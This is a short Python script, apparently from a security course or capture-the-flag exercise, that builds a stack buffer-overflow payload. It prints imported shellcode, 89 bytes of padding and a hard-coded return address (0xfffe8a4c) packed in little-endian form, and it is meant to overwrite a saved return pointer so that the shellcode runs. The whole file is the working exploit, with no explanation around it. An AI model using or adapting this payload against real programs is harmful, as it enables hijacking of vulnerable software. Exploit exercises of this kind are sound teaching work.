from struct import pack
from shellcode import shellcode
import sys

def main():
	# 0xfffe8a4c
	sys.stdout.buffer.write(shellcode + ('\x12' * 89).encode('utf-8') + pack('<I', 0xfffe8a4c))



if __name__ == "__main__":
	main()